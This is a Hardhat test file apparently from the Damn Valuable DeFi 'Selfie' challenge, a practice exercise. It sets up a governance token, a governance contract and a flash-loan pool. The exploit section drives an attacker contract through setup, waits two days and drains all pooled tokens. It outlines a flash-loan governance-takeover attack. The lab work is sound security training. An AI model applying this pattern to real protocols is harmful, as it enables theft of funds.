const { ethers, tracer } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        if (tracer) {
            tracer.nameTags[deployer.address] = "Deployer";
            tracer.nameTags[attacker.address] = "Attacker";
        }

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address, // ATTACK POINT: the pool offers flash loans of its governance token
            this.governance.address
        );

        if (tracer) {
            tracer.nameTags[this.token.address] = "GovernanceToken";
            tracer.nameTags[this.governance.address] = "GovernanceContract";
            tracer.nameTags[this.pool.address] = "SelfiePool";
            console.log(tracer.nameTags);
        }

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
        const attackerFactory = await ethers.getContractFactory("SelfieAttacker", attacker);
        const attackerContract = await attackerFactory.deploy(this.pool.address);

        if (tracer) {
            tracer.nameTags[attackerContract.address] = "AttackerContract";
        }

        await attackerContract.setup(TOKENS_IN_POOL);

        // wait for the action delay
        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

        await attackerContract.attack();
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
